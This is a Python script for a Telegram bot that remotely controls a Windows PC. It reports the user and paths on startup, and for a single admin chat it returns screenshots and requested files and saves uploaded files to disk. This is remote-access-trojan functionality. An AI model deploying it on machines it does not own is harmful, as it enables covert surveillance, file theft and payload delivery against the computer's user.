import telebot
import os
import time

import modules.file_io as file_io
import modules.message_io as mes_io
import modules.system as system
from modules.emoj import *

VERSION = "1.0"
TOKEN_PATH = f"{system.scriptPath}\\token.txt"
START = f"{system.scriptPath}\\data\\message.txt"
AUTOSTART = f"{system.scriptPath}\\data\\on_start.txt"
ADMIN = int(file_io.readFile(f"{system.scriptPath}\\admin.txt"))
ACCESS_DENIED = f"{LOCK}Oops, it looks like this tool doesn't belong to you."


os.chmod(system.scriptPath, 777)

try:
    bot = telebot.TeleBot(file_io.readFile(TOKEN_PATH))
except:
    quit()

try:
    os.chdir(system.defaultStartFolder)
    bot.send_message(ADMIN, f"""{PC}PC Started
==========
{FILE}Script path: <code>{system.scriptPath}</code>
==========
{USER}User: <code>{system.username}</code>
==========
{FOLDER}Current path: <code>{system.getCurrentDir()}</code>
==========
{PREF}Version: {VERSION}
==========""", parse_mode="HTML")
except:
    print("n/a")

@bot.message_handler(commands=["start", "info", "help"])

def start_message(message):
    if message.chat.id == ADMIN:
        bot.send_message(message.chat.id, file_io.readFile(START), parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, ACCESS_DENIED)

@bot.message_handler(content_types=["text"])

def text(message):
    if message.chat.id == ADMIN:
        if message.text == "screen":
            screen = system.getScreen()
            bot.send_document(message.chat.id, open(screen, "rb"))
            os.remove(screen)
        elif "getfile" in message.text:
            try:
                path = system.normalizeString(mes_io.splitter(message.text))
                with open(path, 'rb') as doc:
                    bot.send_document(message.chat.id, doc)
            except Exception as err:
                bot.send_message(message.chat.id, ERROR_STR(f"Something wrong: {err}", "ERROR"))
        else:
            bot.send_message(message.chat.id, mes_io.messageProcessing(message.text), parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, ACCESS_DENIED)

@bot.message_handler(content_types=["document"])
def doc(message): 
    if message.chat.id == ADMIN:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = f'{os.getcwd()}\\{message.document.file_name}'
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message, f"{DONE}Sent {os.getcwd()}")
        except Exception as err:
            bot.send_message(message.chat.id, ERROR_STR(f"Not sent: {err}", "ERROR"))
    else:
        bot.send_message(message.chat.id, ACCESS_DENIED)

while True:
    try: 
        bot.polling(non_stop=True)
    except:
       time.sleep(15)
